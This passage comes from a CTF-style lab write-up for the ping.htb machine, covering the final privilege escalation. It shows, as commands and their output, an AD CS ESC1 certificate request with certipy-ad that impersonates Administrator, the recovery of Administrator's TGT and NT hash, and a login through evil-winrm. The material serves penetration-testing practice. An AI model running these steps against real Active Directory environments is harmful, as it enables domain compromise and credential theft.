- Now I can perform ESC1 and get administrator pfx:
```
export KRB5CCNAME=C.ROBERTS.CCACHE

faketime "+8hours" certipy-ad req -k -no-pass -u c.roberts@ping.htb \
  -target dc1.ping.htb -template SmartcardAuthentication -ca ping-DC1-CA \
  -upn Administrator@ping.htb \
  -sid 'S-1-5-21-750635624-2058721901-1932338391-500'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: dc1.ping.htb.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: PING.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 23
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@ping.htb'
[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
![[Pasted image 20260430115136.png]]

- I get ccache for admin:
```
faketime "+8hours" certipy-ad auth -pfx administrator.pfx -username Administrator -domain ping.htb -dc-ip 10.129.43.72
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@ping.htb'
[*]     SAN URL SID: 'S-1-5-21-750635624-2058721901-1932338391-500'
[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-500'
[*] Using principal: 'administrator@ping.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@ping.htb': aad3b435b51404eeaad3b435b51404ee:63905deb12b527aadfdbc26d3f423eff
```
![[Pasted image 20260430115324.png]]

- I log in as admin:
```
export KRB5CCNAME=administrator.ccache
faketime "+8hours" evil-winrm -i dc1.ping.htb -r PING.HTB
```
![[Pasted image 20260430115516.png]]

- I get root flag:
![[Pasted image 20260430115538.png]]